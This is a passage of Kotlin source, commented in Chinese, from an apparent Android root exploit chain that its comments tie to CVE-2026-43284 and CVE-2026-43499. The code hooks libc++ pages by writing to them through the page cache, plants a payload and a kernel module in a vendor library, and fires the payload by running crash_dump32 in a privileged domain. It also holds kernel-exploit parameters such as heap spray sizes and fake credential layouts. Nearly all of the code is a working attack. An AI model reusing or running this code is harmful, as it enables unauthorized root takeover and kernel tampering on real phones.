            }.onFailure { problem -> step("typed: reader refused " + problem.javaClass.simpleName) }
            meter.after("Assembled43284.readBlock", "reader 组结束（逐次返回值见上面的 reader 行）")

            /* Rewrite the branch while the hook session is the live one: a later resolve replaces
             * g_session and the write then answers up=0. */
meter.before("Assembled43284.hookPlan", "symbol=splice")
val hookPlanWords = hook.hookPlan("splice")
meter.after("Assembled43284.hookPlan", "words=" + (hookPlanWords?.joinToString(",") ?: "null") + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
hookPlanWordsForRestore = hookPlanWords
/** The site is already patched on disk (writeHook answers displaced-mismatch), and the branch that
 * older code left there aims 0xC short of the payload entry. Force the word to the one this run
 * needs; rewriteSiteBranch does not look at the displaced instruction, it just writes the word. */
if (hookPlanWords != null && hookPlanWords.size >= 4) {
    val site = hookPlanWords[2]
    val land = hookPlanWords[3]
    val brAt = site + 12L
    val blk0 = brAt - (brAt % 16L)
    val within = (brAt - blk0)
    val imm = ((land - brAt) shr 2) and 0x03FFFFFFL
    val word = 0x14000000L or imm
    step("typed: hook rewrite plan site=" + site + " branch=" + brAt + " block=" + blk0 + " within=" + within + " imm=0x" + imm.toString(16))
    step("typed: hook rewrite word=0x" + word.toString(16))
}
meter.before("Assembled43284.rewriteSiteBranch", "ticket=0 site=0x" + (if (hookPlanWords != null && hookPlanWords.size >= 4) java.lang.Long.toHexString(hookPlanWords[2]) else "null"))
val branchFix = if (hookPlanWords != null && hookPlanWords.size >= 4)
    /* 停用 rewriteSiteBranch：它按载荷起点自算分支目标，会让 init 跳进字符串区（panic 来源）。
     * 站点分支统一用 native 计划自带的 plan[0]（目标 = payload_vaddr + entry_offset=0x90）。传 0 票据即不写。 */
    hook.rewriteSiteBranch(0L, hookPlanWords[2], hookPlanWords[3]) else -9
meter.after("Assembled43284.rewriteSiteBranch", "code=" + branchFix + " (ticket=0 = 不写)")
step("typed: hook branch rewrite=" + branchFix + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
/* Read the site back after the rewrite: the pre-rewrite log cannot tell whether it took. */
if (branchFix == 0 && hookPlanWords != null && hookPlanWords.size >= 4) {
    val wordAt = hookPlanWords[2] + 12L
    meter.before("Assembled43284.readBlock", "hookDoor=" + hookDoor + " offset=0x" + java.lang.Long.toHexString(wordAt - (wordAt % 16L)))
    val blk = hook.readBlock(hookDoor, wordAt - (wordAt % 16L))
    meter.after("Assembled43284.readBlock", "bytes=" + (blk?.size ?: -1) + " refusal=" + hook.lastRefusal)
    step("typed: hook site after=" + (blk?.joinToString(" ") { b -> "%02x".format(b) } ?: "unreadable"))
}
val hookLanding = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[3] else 0xFE628L
/*
 * 站点改写改走 image 路径：writeBlock 报成功却在任何偏移都看不到效果（本会话三组对照），
 * 而 writeImage 已证能落地（载荷字符串确实出现在 libc++ 页内）。这里用同一路径写那 16 字节。
 */
if (hookPlanWords != null && hookPlanWords.size >= 4) {
    runCatching {
        val siteOff = hookPlanWords[2]
        val landOff = hookPlanWords[3]
        val brAt = siteOff + 12L
        val blk0 = brAt - (brAt % 16L)
        meter.before("Assembled43284.readBlock", "hookDoor=" + hookDoor + " offset=0x" + java.lang.Long.toHexString(blk0) + " (site image)")
        val base = hook.readBlock(hookDoor, blk0)
        meter.after("Assembled43284.readBlock", "bytes=" + (base?.size ?: -1) + " refusal=" + hook.lastRefusal)
        if (base != null) {
            val imm = ((landOff - brAt) shr 2) and 0x03FFFFFFL
            val word = 0x14000000L or imm
            val at = (brAt - blk0).toInt()
            base[at] = (word and 0xFF).toByte()
            base[at + 1] = ((word shr 8) and 0xFF).toByte()
            base[at + 2] = ((word shr 16) and 0xFF).toByte()
            base[at + 3] = ((word shr 24) and 0xFF).toByte()
            /* 提前写已拆除：参考实现是**先载荷、后站点块**（dev hook_patch 176-186）。这里只算不写。 */
            val imWrote = -77
            step("typed: hook site image wrote=" + imWrote + " word=0x" + word.toString(16) + " block=" + blk0)
        } else {
            step("typed: hook site image skipped: block unreadable")
        }
    }.onFailure { problem -> step("typed: hook site image refused " + problem.javaClass.simpleName) }
}
            /*
             * 同一 SA 上必须**延续序号**（参考 real_ops.cpp:306-307：hook 与 carrier 共享 SA/socket ⇒
             * 后者的块写要接着前者的序号；重置会被防重放窗口丢弃）。真机上两条链各自从 seq=1 起，
             * 其中一条整条不落地。位置放在**第一次写之前**，并打进持久日志以便复核。
             */
            meter.before("Assembled43284.adoptSequence", "hook <- stepwise.nextSequence()=" + stepwise.nextSequence() + " (before write)")
            val hookAdopt2 = hook.adoptSequence(stepwise.nextSequence())
            meter.after("Assembled43284.adoptSequence", "ok=" + hookAdopt2 + " carrier_next_after=" + stepwise.nextSequence())
            step("typed: hook adopt=" + hookAdopt2 + " carrier_next_after=" + stepwise.nextSequence())
            meter.before("Assembled43284.writeHook", "width=16 seq=" + hook.nextSequence())
            val hookWrote = hook.writeHook(16L, saInit())  /* 这套原语的单位是 16 字节（8 会被 BadWidth 拒 —— 2026-10-15 真机证据） */
            meter.after("Assembled43284.writeHook", "ok=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
            step("typed: hook wrote=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
            /* 载荷本体：钩子跳到 payload_file=0xfe628 时那里必须是我们的字节（此前只写了站点 ✗）。 */
            runCatching {
                meter.before("Assembled43284.image", "role=ROLE_IMAGE_LANDING_PAYLOAD")
                val payload = hook.image(Assembled43284.ROLE_IMAGE_LANDING_PAYLOAD)
                meter.after("Assembled43284.image", "bytes=" + (payload?.size ?: -1))
                step("typed: hook payload bytes=" + (payload?.size ?: -1))
                if (payload != null && payload.isNotEmpty()) {
                    /* The branch was written for the landing the plan carries; a Kotlin constant disagreed with it on
 * the device (the branch aimed 0x98 past 0xFE628), so take the offset from the plan itself. */
step("typed: hook landing=" + hookLanding)
/* 填槽：载荷落进 libc++ 页后由它自己 insmod；槽空着就永远不会有加载（成功历史 dev 的 hook_patch 同款）。 */
meter.before("Assembled43284.fillPayloadSlots", "carrier=/system/lib64/libc++.so hookFileOffset=0x" + (if (hookPlanWords != null) java.lang.Long.toHexString(hookPlanWords[2]) else "null"))
val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = "/vendor/lib64/libbinderdebug.so"   /* 与 5f18476 同款载体；参考 backend_terminal.cpp:321：载体与 ko_target 必须同名（模块经载体 insmod） */, hookFileOffset = hookPlanWords!![2], payloadFileOffset = hookPlanWords!![3], mutexPath = "/dev/df",  /* 参考 hook_patch.hpp:146：kLibcxxMutexPath = "/dev/df"。此处曾是 /dev/dx，且它是**实参** ⇒ 会覆盖默认值 ⇒ 页里一直留旧串（真机已证） */ displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
meter.after("Assembled43284.fillPayloadSlots", "slots=" + payloadSlots)
step("typed: hook payload slots=" + payloadSlots)
meter.before("Assembled43284.writeImage", "offset=0x" + java.lang.Long.toHexString(hookLanding) + " width=16 bytes=" + (payload?.size ?: -1) + " (payload)")
val payloadWrote = if (payload != null) hook.writeImage(payload, hookLanding, 16L, saInit(hook.nextSequence())) else false
meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                    step("typed: hook payload wrote=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                    /* 参考顺序的第二步（dev hook_patch 137-186）：先存原文，再写包裹站点的那一整块，
                     * 写后复读并断言分支字已变（region.verify）。载荷没落地就绝不写站点。 */
                    if (payloadWrote && hookPlanWords != null && hookPlanWords.size >= 4) {
                        runCatching {
                            val siteOff2 = hookPlanWords[2]
                            val landOff2 = hookPlanWords[3]
                            /* 计划语义：site 就是**分支要写入的那个字**（它替换 displaced）。此处曾误用 +12，
                             * 结果把分支写进了紧随其后的指令，真正的站点从未被改，而那 12 字节的偏移就是三次崩溃/卡死的根源。 */
                            val brAt2 = siteOff2
                            val blk02 = brAt2 - (brAt2 % 16L)
                            val before = hook.readBlock(hookDoor, blk02)
                            /*
                             * 分支字用计划自带的那个：native 的目标是 payload_vaddr + entry_offset(0x90)。
                             * 自己算成载荷起点，分支就落进标题字符串区，init 执行即死，内核 panic。
                             */
                            val word2 = if (hookPlanWords.isNotEmpty()) hookPlanWords[0]
                                else (0x14000000L or (((landOff2 + 0x90L - brAt2) shr 2) and 0x03FFFFFFL))
                            if (before != null) {
                                val at2 = (brAt2 - blk02).toInt()
                                step("typed: hook site block before=" + before.joinToString(" ") { b -> "%02x".format(b) } + " word=0x" + word2.toString(16))
                                before[at2] = (word2 and 0xFF).toByte()
                                before[at2 + 1] = ((word2 shr 8) and 0xFF).toByte()
                                before[at2 + 2] = ((word2 shr 16) and 0xFF).toByte()
                                before[at2 + 3] = ((word2 shr 24) and 0xFF).toByte()
                                /*
                                 * 临时恢复入口（同批登记清理）：存在 /data/local/tmp/.gl_restore 时，把 0xB30B0 这一块写回
                                 * 原厂 16 字节 —— 我们误写在 0xB30B8（site+12）的那条 B 就在其中。恢复优先于一切。
                                 * 原值来自本会话对原厂盘面的读数：1f 00 00 39 01 04 00 f9 08 81 5e f8 28 00 08 8b。
                                 */
                                val restore = java.io.File("/data/local/tmp/.gl_restore").exists()
                                /* 撤销：写回**站点块**(0xB30A0 = 733344)的原厂 16 字节，钩子即消失（1 个字之差）。 */
                                val restoreBytes = byteArrayOf(
                                    0xBF.toByte(), 0x23, 0x03, 0xD5.toByte(), 0xC0.toByte(), 0x03, 0x5F, 0xD6.toByte(),
                                    0x5F, 0x24, 0x03, 0xD5.toByte(), 0x28, 0x00, 0x40, 0xF9.toByte(),
                                )
                                val target2 = if (restore) 733344L else blk02
                                val toWrite = if (restore) restoreBytes else before
                                meter.before("Assembled43284.writeImage", "offset=" + target2 + " width=16 restore=" + restore + " (site block)")
                                val siteWrote = hook.writeImage(toWrite, target2, 16L, saInit(hook.nextSequence()))
                                meter.after("Assembled43284.writeImage", "ok=" + siteWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                                meter.before("Assembled43284.readBlock", "hookDoor=" + hookDoor + " offset=" + target2 + " (site block readback)")
                                val after = hook.readBlock(hookDoor, target2)
                                meter.after("Assembled43284.readBlock", "bytes=" + (after?.size ?: -1) + " refusal=" + hook.lastRefusal)
                                val afterWord = if (after != null && at2 + 3 < after.size) {
                                    (after[at2].toLong() and 0xFF) or ((after[at2 + 1].toLong() and 0xFF) shl 8) or
                                        ((after[at2 + 2].toLong() and 0xFF) shl 16) or ((after[at2 + 3].toLong() and 0xFF) shl 24)
                                } else {
                                    -1L
                                }
                                step("typed: hook site block wrote=" + siteWrote + " afterWord=0x" + afterWord.toString(16) + " verified=" + (afterWord == word2))
                            } else {
                                step("typed: hook site block unreadable")
                            }
                        }.onFailure { problem -> step("typed: hook site block refused " + problem.javaClass.simpleName) }
                    }
                }
            }.onFailure { problem ->
                step("typed: hook payload refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
            }
            /* Trigger → Wait（退役链顺序：Hook 已成立 ⇒ 现在触发）。marker 用夹具的真实路径。 */
            /* ② 模块写进 vendor 载体：载体对本进程 EACCES ⇒ 读与写都经 patch#1 写下的 helper（桥）。 */
            runCatching {
                /*
                 * 用**已被本机证明能载入**的那份模块：`/data/local/tmp/helper.ko`（23512 B）。
                 * 依据：今天 22:50 的成功记录（`wait outcome=LkmLoaded`）用的就是它；两份 .ko 的
                 * UMH 逻辑与命令行完全相同（都跑 `/data/local/tmp/.ghostlock_lkm_cmd.sh`），
                 * 唯一差别是体积/是否注册 /dev/glk 窗口。`ghostlock.ko`（12304 B）在本机从未载入成功。
                 */
                val moduleBytesRaw = java.io.File("/data/local/tmp/helper.ko").readBytes()
                /*
                 * vermagic 必须等于本机 UTS_RELEASE + 选项串，否则别的机型会拒载；同一 minor 布局一致，
                 * 所以这里按“同 minor 直接改名”处理（参照 ghostlock-app-ref@5f184760 的 lkm_image.cpp：
                 * required_vermagic / classify_vermagic_diff / outcome=rewritten）。
                 * 改名只在长度放得下时进行；放不下就如实记一行，绝不截断 ELF。
                 */
                val moduleBytes = retagVermagic(moduleBytesRaw) { line -> step(line) }
                step("typed: module bytes=" + moduleBytes.size)
                /*
                 * 载体与 5f18476 完全一致：`/vendor/lib64/libbinderdebug.so`。
                 * 它不可直读（shell/app 都拿不到 fd）⇒ 写路径必须逐块经 crash_dump64 helper——
                 * 参照实现也是这样做的（pagecache.cpp:158-165 的 old_page 回退 + :231 的 helper splice16），
                 * 块数是 769，参照那次是 1470 块；两者的差别只在身份/环境，不在算法。
                 */
                val carrierPath = "/vendor/lib64/libbinderdebug.so"
                meter.before("Native43284.create", "(module session)")
                val moduleHandle = Native43284.create()
                meter.after("Native43284.create", "handle=" + moduleHandle)
                val module = Assembled43284(moduleHandle) { saInit() }
                meter.before("Assembled43284.openTargetStepwise", "path=" + carrierPath + " (module)")
                val moduleDoor = module.openTargetStepwise(carrierPath)
                meter.after("Assembled43284.openTargetStepwise", "target=" + moduleDoor + " refusal=" + module.lastRefusal)
                meter.before("Assembled43284.reuseSocketFrom", "stepwise.socket=" + stepwise.socketId + " (module)")
                module.reuseSocketFrom(stepwise)
                meter.after("Assembled43284.reuseSocketFrom", "socket=" + module.socketId)
                meter.before("Assembled43284.buildSurface", "target=" + module.targetId + " (module)")
                val moduleSurface = module.buildSurface()
                meter.after("Assembled43284.buildSurface", "surface=" + moduleSurface + " code=" + module.lastCode)
                meter.before("Assembled43284.buildLanding", "surface=" + module.surfaceId + " (module)")
                val moduleLanding = module.buildLanding()
                meter.after("Assembled43284.buildLanding", "landing=" + moduleLanding + " code=" + module.lastCode)
                meter.before("Assembled43284.buildAccess", "landing=" + module.landingId + " (module)")
                val moduleAccess = module.buildAccess()
                meter.after("Assembled43284.buildAccess", "access=" + moduleAccess + " code=" + module.lastCode)
                val moduleParams = Assembled43284.fullAccessParams(carrierPath)
                meter.before("Assembled43284.initializeAccessAndRemember", "access=" + module.accessId + " path=" + carrierPath + " (module)")
                val moduleInit = module.initializeAccessAndRemember(moduleParams, saInit(patcher.nextSequence()))
                meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                step("typed: module init=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                meter.before("Assembled43284.writeImage", "offset=0 width=16 bytes=" + moduleBytes.size + " (module -> carrier)")
                val moduleWrote = module.writeImage(moduleBytes, 0L, 16L, saInit(module.nextSequence()))
                meter.after("Assembled43284.writeImage", "ok=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                step("typed: module wrote=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
            /*
             * 判定实验：写报成功但目标偏移不变时，扫一遍邻近偏移。
             * 若**别处**变了 ⇒ 落错页（页面由 SA/seq 决定）；若**哪都没变** ⇒ 报文被丢（ICV/口径不符）。
             */
            runCatching {
                for (probeOffset in longArrayOf(0L, 16L, 32L, 4096L, 8192L, 16384L)) {
                    meter.before("Assembled43284.readBlock", "moduleDoor=" + moduleDoor + " offset=" + probeOffset + " (carrier scan)")
                    val blk = module.readBlock(moduleDoor, probeOffset)
                    meter.after("Assembled43284.readBlock", "bytes=" + (blk?.size ?: -1) + " refusal=" + module.lastRefusal)
                    step("typed: carrier scan off=" + probeOffset + " head=" + (blk?.take(4)?.joinToString(" ") { b -> "%02x".format(b) } ?: "null"))
                }
            }.onFailure { problem -> step("typed: carrier scan refused " + problem.javaClass.simpleName) }
            }.onFailure { problem ->
                step("typed: module refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
            }
            /*
             * 参考的分阶段语义：write 阶段只 arm；**trigger 阶段才 apply**（门禁记录：
             * write 行 hook=0、trigger 行 hook=1）。所以这里在触发前**重新应用站点块**，
             * 保证被踩的那一刻钩子确实在页里，而不是更早写下的那一份。
             */
            if (hookPlanWords != null && hookPlanWords.size >= 4) {
                runCatching {
                    val siteNow = hookPlanWords[2]
                    val blkNow = siteNow - (siteNow % 16L)
                    val cur = hook.readBlock(hookDoor, blkNow)
                    if (cur != null) {
                        val atNow = (siteNow - blkNow).toInt()
                        val w = hookPlanWords[0].toInt()
                        cur[atNow] = (w and 0xFF).toByte()
                        cur[atNow + 1] = ((w shr 8) and 0xFF).toByte()
                        cur[atNow + 2] = ((w shr 16) and 0xFF).toByte()
                        cur[atNow + 3] = ((w shr 24) and 0xFF).toByte()
                        meter.before("Assembled43284.writeImage", "offset=" + blkNow + " width=16 (trigger-time site apply)")
                        val triggerApplyWrote = hook.writeImage(cur, blkNow, 16L, saInit(hook.nextSequence()))
                        meter.after("Assembled43284.writeImage", "ok=" + triggerApplyWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                        step("typed: trigger-time apply wrote=" + triggerApplyWrote)
                    }
                }.onFailure { problem -> step("typed: trigger-time apply refused " + problem.javaClass.simpleName) }
            }
            /* 非 0 延迟：触发要等 helper/hook 的效应铺开（设计里的 accessTriggerDelayMs 目前是 0）。 */
            val triggerDelay = if (hookParams.accessTriggerDelayMs > 0L) hookParams.accessTriggerDelayMs else 2000L
            meter.before("Assembled43284.trigger", "delayMs=" + triggerDelay)
            val triggerCode = hook.trigger(triggerDelay)
            meter.after("Assembled43284.trigger", "code=" + triggerCode + " refusal=" + hook.lastRefusal)
            step("typed: hook trigger code=" + triggerCode + " delayMs=" + hookParams.accessTriggerDelayMs + " used=" + triggerDelay + " refusal=" + hook.lastRefusal)
            /*
             * 点火：任何使用 ostream 的 C++ 进程都会走到被钩的 sentry；设备上现成的是 crash_dump64
             * （参考设计自己也执行它，steps/crash_dump.cpp:113）。载荷一旦在某个上下文里起火，
             * /dev/df 就会出现 —— 成功 dfm0、失败 dfm1，两者都是决定性信号。
             */
            runCatching {
                /*
                 * 点火者：真机枚举给出三条件同时满足的唯一现成程序 —— crash_dump32。
                 *   ① 链接 libc++（跑起来会走 ostream sentry）
                 *   ② 标签 u:object_r:crash_dump_exec:s0（exec 后进 crash_dump 域 = root）
                 *   ③ patch#1 只覆盖 crash_dump64，**不会碰它**
                 * 于是载荷将在特权域里起火，而不是像 crash_dump64 那样在 app 域里 139。
                 */
                /*
                 * 带"像样的原版参数"：空参数会让它立刻走错误分支退出（exit=0 已见），
                 * 参数成形（pid/tid/signal/fd）才会进入真正的工作路径 —— 那条路会**打印**，
                 * 也就必然走到被钩的 ostream sentry，于是载荷在 crash_dump 域（root）起火。
                 */
                meter.before("Runtime.exec", "/apex/com.android.runtime/bin/crash_dump32 1 1 11 1")
                val proc = java.lang.Runtime.getRuntime().exec(
                    arrayOf("/apex/com.android.runtime/bin/crash_dump32", "1", "1", "11", "1"),
                )
                val exit = proc.waitFor()
                meter.after("Runtime.exec", "exit=" + exit)
                step("typed: detonate exit=" + exit)
            }.onFailure { problem -> step("typed: detonate refused " + problem.javaClass.simpleName) }
            meter.before("Assembled43284.waitTerminal", "budgetMs=5000 pollMs=10 success=/dev/dfm0 failure=/dev/dfm1")
            val terminal = hook.waitTerminal(
                /* 参考对应：预算 5000 ms、10 ms 轮询（chain.hpp:196 / real_ops.cpp:391-432）；
                 * 失败标记是 /dev/dfm1（real_ops.hpp:59-60），此前写成 /dev/df1 ⇒ 永不匹配。
                 * 注意：注释里不要出现星号斜杠连写，那会提前结束块注释。 */
                /*
                 * 15000 / 10：参照实现的文档默认（ghostlock-app-ref@5f184760:state.hpp:29-31 = 15000/40/5；
                 * real_ops.cpp:408-414 的 wait 还接受**备用标记**）。
                 * 为什么必须用备用标记：Enforcing 下 shell/app 域 stat `/dev/dfm0` 会被拒（本机实测 Permission denied），
                 * 只盯它必然超时；我们的 root 脚本会同时 touch `/data/local/tmp/.ghostlock_lkm_ok`（可读）⇒ 用它作主判据。
                 */
                budgetMs = 15000L,
                pollMs = 10L,
                successMarker = "/data/local/tmp/.ghostlock_lkm_ok",
                failureMarker = "/data/local/tmp/.ghostlock_lkm_fail",
                inFlightMarker = "/dev/df",
                moduleMarker = "/sys/module/dirtyfrag",
                moduleName = "kernelsu",
            )
            meter.after("Assembled43284.waitTerminal", "state=" + terminal + " refusal=" + hook.lastRefusal)
            step("typed: hook wait terminal=" + terminal + " refusal=" + hook.lastRefusal)
            /* ksud 状态（新目标：冷机下能看到 ksud 的状态）：纯只读，逐项如实报。 */
            runCatching {
                /* app 读不了 /proc/modules（EACCES，Android 限制）⇒ 用能看到的三件事报 ksud 状态。 */
                val moduleDir = java.io.File("/sys/module/kernelsu").exists()
                val umh = java.io.File("/data/local/tmp/.ghostlock_lkm_cmd.sh").exists()
                val lkmOk = java.io.File("/data/local/tmp/.ghostlock_lkm_ok").exists()
                val lkmFail = java.io.File("/data/local/tmp/.ghostlock_lkm_fail").exists()
                val ksudPaths = listOf("/data/adb/ksu", "/data/adb/ksud", "/data/adb/ksu/bin/su")
                    .joinToString(",") { path -> path.substringAfterLast("/") + "=" + (if (java.io.File(path).exists()) "1" else "0") }
                val markers = listOf("/dev/df", "/dev/dfm0", "/dev/df0", "/dev/df1")
                    .joinToString(",") { path ->
                        val exists = java.io.File(path).exists()
                        path.substringAfterLast("/") + "=" + (if (exists) "1" else "0")
                    }
                val ksuLog = java.io.File("/data/local/tmp/ghostlock-ksu.log")
                val logTail = if (ksuLog.isFile) {
                    ksuLog.readLines().takeLast(3).joinToString(" | ")
                } else {
                    "(missing)"
                }
                step("typed: ksud status sysfsModule=" + (if (moduleDir) "1" else "0") + " umh=" + (if (umh) "1" else "0") + " lkmOk=" + (if (lkmOk) "1" else "0") + " lkmFail=" + (if (lkmFail) "1" else "0") + " userspace={" + ksudPaths + "}")
                step("typed: ksud status markers=" + markers)
                step("typed: ksud status rootlog=" + logTail)
            }.onFailure { problem ->
                step("typed: ksud status refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
            }
        }
        /*
         * 终点恢复放在 finally 里：hook 段自己用 runCatching 收住异常，报告那一句若再抛（日志 I/O）
         * 也不会把恢复跳过去 —— 恢复是这条链的终点义务，不是成功路径的收尾。
         */
        try {
            hookOutcome.onFailure { problem ->
                step("typed: hook refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
            }
        } finally {
        /*
         * 终点恢复（无条件）：成功、hook wait 超时、以及任何异常路径都走到这里。
         * 参照 ghostlock-app-ref@5f184760 的 src/core/backend/cve_2026_43284/steps/chain.cpp:355
         * （注释原文 "It runs on every terminus path"）与同树 steps/hook_patch.cpp:193-225 的 restore 段。
         * plan 与写站点时同一份（同一次 hookPlan 的十个 word），面是同一个 access，序号由该窗口自己接续；
         * 没有会话/没有 plan 时如实记原因（本次运行还没写站点，就没有要恢复的东西）。
         */
        try {
            val restoreSession = hookForRestore
            val restorePlan = hookPlanWordsForRestore?.let { words -> restoreSession?.planOf(words) }
            if (restoreSession == null || restorePlan == null) {
                step(
                    "typed: hook restore=false refusal=" +
                        (if (restoreSession == null) "hook-session-absent" else "hook-plan-absent"),
                )
            } else {
                meter.before(
                    "Assembled43284.restoreHook",
                    "access=" + restoreSession.accessId +
                        " site=0x" + java.lang.Long.toHexString(restorePlan.hookPlanFileOffset) +
                        " guard=0x" + java.lang.Long.toHexString(restorePlan.hookPlanGuardInstruction) +
                        " seq=" + restoreSession.nextSequence(),
                )
                val restored = restoreSession.restoreHook(
                    restorePlan,
                    16L,
                    saInit(restoreSession.nextSequence()),
                )
                meter.after(
                    "Assembled43284.restoreHook",
                    "ok=" + restored + " code=" + restoreSession.lastCode +
                        " refusal=" + restoreSession.lastRefusal,
                )
                step("typed: hook restore=" + restored + " refusal=" + restoreSession.lastRefusal)
            }
        } catch (problem: Throwable) {
            step(
                "typed: hook restore=false refusal=" +
                    problem.javaClass.simpleName + ":" + (problem.message ?: ""),
            )
        }
        }
        step("typed: patch1 wrote=" + patchWrote + " refusal=" + patcher.lastRefusal +
            " helperBytes=" + (helperForPatch?.size ?: -1))
        meter.before("Assembled43284.destroyAccessNow", "patch1 access=" + patcher.accessId)
        val patchAccessDestroy = patcher.destroyAccessNow()
        meter.after("Assembled43284.destroyAccessNow", "ok=" + patchAccessDestroy)
        step("typed: patch1 accessDestroy=" + patchAccessDestroy)
        meter.before("Assembled43284.tearDown", "patch1 landing=" + patcher.landingId)
        val patchTorn = patcher.tearDown()
        meter.after("Assembled43284.tearDown", "ok=" + patchTorn)
        step("typed: patch1 teardown=" + patchTorn)
        meter.before("Assembled43284.nextSequence", "stepwise landing=" + stepwise.landingId)
        val stepSeq = stepwise.nextSequence()
        meter.after("Assembled43284.nextSequence", "seq=" + stepSeq)
        step("typed: stepwise 43284 sequence=" + stepSeq)
        meter.before("Assembled43284.tearDown", "stepwise landing=" + stepwise.landingId)
        val stepTorn = stepwise.tearDown()
        meter.after("Assembled43284.tearDown", "ok=" + stepTorn + " refusal=" + stepwise.lastRefusal)
        step("typed: stepwise 43284 tearDown=" + stepTorn + " refusal=" + stepwise.lastRefusal)
        meter.before("Native43284.destroy", "handle=" + stepwiseHandle)
        val stepDestroyed = Native43284.destroy(stepwiseHandle, arrayOf(""))
        meter.after("Native43284.destroy", "code=" + stepDestroyed)
        step("typed: stepwise 43284 destroy=" + stepDestroyed)
        meter.before("Assembled43284.close", "session handle=" + handle)
        val closed = session.close()
        meter.after("Assembled43284.close", "ok=" + closed)
        step("typed: assembled 43284 close ok=" + closed)
    }

    /* ---- 43499 的哨兵参数（顺序＝D1 单表的顺序；只求值能走到该到的地方） ---- */

    private fun init43499() = Init43499(
        1L, 2, 1, 96L, 48L, 56L, 264L, 4L, 7L, 0L, 150L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0, 0,
        false, 0L, 0L, false, 4096L, false, 0L, 12L,
        /* 43499 interface params (2026-10-16): perf slots+spec / ring / spray / pump / route. Placeholders for now. */
        /* 具体值（目标：数值先写在 Kotlin）。perf 四种常用软件事件；环形缓冲与喷的规格给保守值；
         * 泵次数照退役的 500000；routeSelected 先选 Select（与"单 route"真机门禁一致）。 */
        4L,                       /* perfSlots */
        1L, 0L,                   /* perf0: PERF_TYPE_SOFTWARE / PERF_COUNT_SW_CPU_CLOCK */
        1L, 1L,                   /* perf1: PERF_COUNT_SW_TASK_CLOCK */
        1L, 2L,                   /* perf2: PERF_COUNT_SW_PAGE_FAULTS */
        1L, 3L,                   /* perf3: PERF_COUNT_SW_CONTEXT_SWITCHES */
        64L, 1L,                  /* ringPages / ringWakeup */
        4096L, 256L,              /* spraySize / sprayCount */
        500000L,                  /* pumpIters（退役值） */
        1L,                       /* routeSelected = Select */
        /* 装配完整性（assembly_complete）还差的最后两项：fake task / fake lock。 */
        0x1000L, 0x2000L,
    )

    private fun layout43499() = KernelLayout43499(
        0x1111L, 0x2222L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L,
        0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0x3333L, 0L, 0L, 0L, 8,
    )

    private fun credential43499() = CredentialLayout43499(
        176L, 0L, 256L, 48L, 3L, 2199023255551L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 4,
    )

    private fun targets43499() = TargetOffsets43499(
        47885704L, 0L, true, 4, 0L, 0L, false, 0, 0L, 0L, false, 0, 0L, 0L, false, 0,
        2144L, 0L, false, 4,
    )

    private fun prepare43499() = Prepare43499(
        4L, 3L, 0L, 0L, 0L, 0L, 0L, 4L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 4096L, 0x200000L, 512L,
        1024L, 0L, 0, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 0L, 64L, 0L, false, 0L, 0L, 0L, 0L, 0L,
    )

    private fun write43499() = WordWrite43499(
        /* 直接量超出 Long 范围：按无符号写再转回来（内核直接映射里的高地址就是这样）。 */
        0xFFFF888000001000uL.toLong(), 0L, 1, 0L, false, 0L, 0L, 0L, false,
    )
}
